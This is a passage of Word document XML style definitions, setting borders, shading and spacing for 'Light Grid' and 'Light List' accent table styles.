          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent4">
    <w:name w:val="Light Grid Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00929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29F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00929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29F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00929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29F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent5">
    <w:name w:val="Light Grid Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E527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E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E527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E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E527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E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent6">
    <w:name w:val="Light Grid Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00769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698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00769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698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00769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698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="007698" w:themeColor="accent6"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList">
    <w:name w:val="Light List"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E5272" w:themeFill="text1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent1">
    <w:name w:val="Light List Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="68727B" w:themeFill="accent1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent2">
    <w:name w:val="Light List Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D94D22" w:themeFill="accent2"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent4">
    <w:name w:val="Light List Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="00929F" w:themeFill="accent4"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent5">
    <w:name w:val="Light List Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
